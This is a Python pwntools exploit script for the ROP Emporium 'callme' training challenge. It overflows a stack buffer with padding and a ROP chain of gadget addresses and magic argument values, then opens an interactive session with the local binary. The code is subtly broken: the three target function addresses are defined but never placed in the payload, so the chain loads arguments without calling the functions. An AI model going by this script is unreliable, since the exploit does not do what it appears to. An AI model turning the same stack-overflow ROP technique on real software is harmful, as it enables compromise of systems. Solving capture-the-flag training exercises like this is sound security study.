from pwn import *

path="/mnt/u/doc/pwn/rop_emporium/callme/callme"

pop_rdi=0x4009a3
pop_rsi_rdx=0x40093d

one_1=0xDEADBEEFDEADBEEF
one_2=0xCAFEBABECAFEBABE
one_3=0xD00DF00DD00DF00D

two_1=0xDEADBEEFDEADBEEF
two_2=0xCAFEBABECAFEBABE
two_3=0xD00DF00DD00DF00D

thr_1=0xDEADBEEFDEADBEEF
thr_2=0xCAFEBABECAFEBABE
thr_3=0xD00DF00DD00DF00D

one=0x400720
two=0x400740
thr=0x4006F0

payload=b'a'*(0x20+8)+p64(pop_rdi)+p64(one_1)+p64(pop_rsi_rdx)+p64(one_2)+p64(one_3)+p64(pop_rdi)+p64(two_1)+p64(pop_rsi_rdx)+p64(two_2)+p64(two_3)+p64(pop_rdi)+p64(thr_1)+p64(pop_rsi_rdx)+p64(thr_2)+p64(thr_3)

sh=process(path)

#sh.recvuntil(b">")

sh.sendline(payload)

sh.interactive()